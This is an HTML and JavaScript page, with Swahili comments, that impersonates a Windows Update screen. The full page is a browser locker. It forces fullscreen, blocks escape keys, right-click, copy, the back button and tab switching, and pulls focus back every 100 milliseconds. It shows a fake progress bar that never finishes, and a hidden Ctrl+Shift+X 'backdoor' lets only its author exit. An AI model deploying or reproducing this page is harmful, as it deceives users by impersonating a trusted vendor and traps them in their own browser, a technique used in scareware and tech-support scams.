 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Windows Update</title>
<style>
  /* ===== RESET KAMILI ===== */
  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body {
    height: 100%;
    width: 100%;
    overflow: hidden;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: #003f6b;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: white;
    cursor: wait;
    user-select: none;
    -webkit-user-select: none;
    z-index: 9999998;
  }

  /* ===== OVERLAY KUBWA — Inafunika skrini nzima ===== */
  #screenCover {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
    z-index: 999999999;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: wait;
  }

  /* Hakuna kitu kinachoweza kubonyezwa */
  #screenCover * {
    pointer-events: none;
  }

  .container {
    text-align: center;
    max-width: 600px;
    padding: 40px;
  }

  .logo {
    width: 80px;
    height: 80px;
    margin: 0 auto 30px auto;
    background: rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.05); opacity: 0.8; }
  }

  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; letter-spacing: 0.5px; }
  .subtitle { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 40px; }

  .progress-container {
    width: 100%;
    max-width: 480px;
    margin: 0 auto;
    background: rgba(255,255,255,0.2);
    border-radius: 12px;
    height: 14px;
    overflow: hidden;
    position: relative;
  }

  .progress-bar {
    height: 100%;
    width: 3%;
    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
    border-radius: 12px;
    transition: width 0.5s ease;
    position: relative;
  }

  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    animation: shimmer 2s infinite;
  }

  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .progress-label { font-size: 14px; color: rgba(255,255,255,0.8); margin-top: 12px; font-family: 'Segoe UI', monospace; }
  .info-text { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 50px; line-height: 1.6; }

  .spinner-container { margin: 30px auto 0; display: flex; justify-content: center; gap: 8px; }

  .dot {
    width: 10px; height: 10px;
    background: rgba(255,255,255,0.4);
    border-radius: 50%;
    animation: dotPulse 1.5s infinite ease-in-out;
  }
  .dot:nth-child(2) { animation-delay: 0.2s; }
  .dot:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotPulse {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
    40% { transform: scale(1); opacity: 1; }
  }

  .restart-notice {
    margin-top: 25px;
    font-size: 13px;
    color: rgba(255,255,255,0.35);
    animation: fadeInOut 4s infinite;
  }

  @keyframes fadeInOut {
    0%, 100% { opacity: 0.35; }
    50% { opacity: 0.7; }
  }

  /* Hii inaficha scrollbars zote */
  ::-webkit-scrollbar { display: none; }
</style>
</head>
<body>

<!-- ===== SCREEN COVER — Inafunika SKRINI NZIMA ===== -->
<div id="screenCover">
  <div class="container">
    <div class="logo">⚙️</div>
    <h1>Installing updates</h1>
    <p class="subtitle">Please wait a moment</p>

    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="progress-label" id="progressLabel">3%</div>

    <div class="spinner-container">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>

    <p class="info-text">
      Your device may restart several times.<br>
      <strong>Do not turn off your device.</strong>
    </p>

    <p class="restart-notice" id="restartNotice">⏳ Checking for updates...</p>
  </div>
</div>

<script>
// =============================================================
// HATUA 1: FUNIKA SKRINI MARA MOJA — 0ms DELAY
// =============================================================
(function() {
  const cover = document.getElementById('screenCover');
  cover.style.position = 'fixed';
  cover.style.top = '0';
  cover.style.left = '0';
  cover.style.width = '100vw';
  cover.style.height = '100vh';
  cover.style.zIndex = '999999999';
  cover.style.background = 'linear-gradient(135deg, #005a9e 0%, #003f6b 100%)';
  cover.style.display = 'flex';
  cover.style.justifyContent = 'center';
  cover.style.alignItems = 'center';
})();

// =============================================================
// HATUA 2: JARIBU FULLSCREEN KWA NJIA ZOTE
// =============================================================
function goFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) {
    el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
  }
  else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
  else if (el.msRequestFullscreen) { el.msRequestFullscreen(); }
  else if (el.mozRequestFullScreen) { el.mozRequestFullScreen(); }
}

goFullscreen();

// =============================================================
// HATUA 3: ZUIA NJIA ZOTE ZA KUTOROKA
// =============================================================

// 3a. ZUIA KEYBOARD
document.addEventListener('keydown', function(e) {
  const keys = [27, 122, 116, 123, 18, 9, 91, 92, 93]; // Esc, F11, F5, F12, Alt, Tab, Win
  if (keys.includes(e.keyCode) || e.key === 'Escape' || e.key === 'F11' || e.key === 'F5' || e.key === 'F12' || e.key === 'ContextMenu') {
    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;
  }
  if (e.ctrlKey && ['w','q','r','t','n','s','u','d','f'].includes(e.key.toLowerCase())) { e.preventDefault(); return false; }
  if (e.altKey && ['F4','Tab','d','f','e'].includes(e.key)) { e.preventDefault(); return false; }
});

// 3b. ZUIA RIGHT CLICK
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });

// 3c. ZUIA SELECTION + DRAG + COPY
document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
document.addEventListener('cut', function(e) { e.preventDefault(); return false; });

// 3d. ZUIA BACK BUTTON
history.pushState(null, null, location.href);
window.addEventListener('popstate', function() {
  history.pushState(null, null, location.href);
});

// 3e. ZUIA KUFUNGA TAB
window.addEventListener('beforeunload', function(e) {
  e.preventDefault();
  e.returnValue = 'Windows Update in progress. Please wait.';
  return 'Windows Update in progress. Please wait.';
});

// 3f. ZUIA KUBADILISHA TAB — RUDISHA MARA MOJA
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    setTimeout(function() {
      window.focus();
      goFullscreen();
    }, 1);
  }
});

// 3g. ZUIA ALT+TAB — RUDISHA
window.addEventListener('blur', function() {
  setTimeout(function() {
    window.focus();
  }, 10);
});

// 3h. ZUIA KWENYE SAFARI (iOS)
window.addEventListener('pagehide', function(e) {
  e.preventDefault();
  return false;
});

// 3i. ZUIA RESIZE (user hawezi kubadilisha ukubwa wa window)
window.addEventListener('resize', function() {
  // Leta tena cover
  const cover = document.getElementById('screenCover');
  cover.style.width = window.innerWidth + 'px';
  cover.style.height = window.innerHeight + 'px';
  goFullscreen();
});

// =============================================================
// HATUA 4: KAMA FULLSCREEN INAISHI — RUDISHA OVERLAY + FULLSCREEN
// =============================================================
function ensureCover() {
  const cover = document.getElementById('screenCover');
  cover.style.display = 'flex';
  cover.style.width = window.innerWidth + 'px';
  cover.style.height = window.innerHeight + 'px';

  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
    goFullscreen();
  }
}

document.addEventListener('fullscreenchange', ensureCover);
document.addEventListener('webkitfullscreenchange', ensureCover);
document.addEventListener('mozfullscreenchange', ensureCover);
document.addEventListener('MSFullscreenChange', ensureCover);

// Angalia kila millisekunde 100 (kasi)
setInterval(ensureCover, 100);

// =============================================================
// FAKE PROGRESS (haifikii 100%)
// =============================================================
let percent = 3;
let phase = 0;

const messages = [
  '⏳ Checking for updates...',
  '📦 Downloading update 1 of 3...',
  '⚙️ Applying updates...',
  '🔄 Configuring system settings...',
  '📦 Downloading update 2 of 3...',
  '🔧 Installing component updates...',
  '📦 Downloading update 3 of 3...',
  '⚙️ Finalizing installation...',
  '🔄 Preparing for restart...',
  '⏳ Please wait...',
  '📦 Installing update for Windows...',
  '🔒 Applying security patches...',
  '⚠️ Do not restart your PC',
  '🔄 Configuring Windows Update...',
  '✅ Almost done...',
];

function updateProgress() {
  phase++;
  if (phase < 10) percent = 3 + (phase * 1.5);
  else if (phase < 25) percent = 16 + ((phase-10) * 1.2);
  else if (phase < 45) percent = 34 + ((phase-25) * 1.0);
  else if (phase < 65) percent = 54 + ((phase-45) * 0.8);
  else if (phase < 90) percent = 70 + ((phase-65) * 0.6);
  else if (phase < 130) percent = 85 + ((phase-90) * 0.3);
  else percent = 99;
  if (percent > 99) percent = 99;

  document.getElementById('progressBar').style.width = percent + '%';
  document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';

  const msgIndex = Math.min(Math.floor(phase/8), messages.length-1);
  document.getElementById('restartNotice').textContent = messages[msgIndex];

  let delay = 1000;
  if (phase > 20) delay = 1500;
  if (phase > 40) delay = 2500;
  if (phase > 60) delay = 3500;
  if (phase > 90) delay = 5000;
  if (phase > 120) delay = 7000;

  setTimeout(updateProgress, delay);
}

updateProgress();

// =============================================================
// BACKDOOR YAKO: Ctrl+Shift+X → Kutoroka
// =============================================================
document.addEventListener('keydown', function(e) {
  if (e.ctrlKey && e.shiftKey && e.key === 'X') {
    document.getElementById('screenCover').style.display = 'none';
    if (document.exitFullscreen) document.exitFullscreen();
    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
    else if (document.msExitFullscreen) document.msExitFullscreen();
    window.location.href = 'about:blank';
    return true;
  }
});

console.log('%c🔧 Windows Update started...', 'font-size:20px;color:#4db8ff;');
console.log('%c⚠️ DO NOT CLOSE THIS TAB', 'font-size:16px;color:#ff6666;');
</script>
</body>
</html>
